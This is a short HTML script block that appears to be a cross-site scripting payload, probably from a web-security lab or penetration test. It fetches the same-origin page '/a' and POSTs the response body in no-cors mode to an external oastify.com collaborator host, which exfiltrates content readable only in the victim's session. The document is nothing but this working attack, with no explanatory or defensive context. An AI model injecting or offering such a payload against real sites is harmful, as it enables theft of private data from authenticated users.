<script>
  fetch('/a').then(response => response.text()).then(body => {
  // Send a POST request with the body data
  fetch('https://yln0wd4bkwwiw8u5iz0vasqfa6gx4xzlo.oastify.com/a', {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'text/plain'
    },
    body: body
  })
  .then(() => {
    console.log('Request sent successfully');
  })
  .catch(error => {
    console.error('Error:', error);
  });
})
.catch(error => {
  console.error('Error:', error);
});
</script>
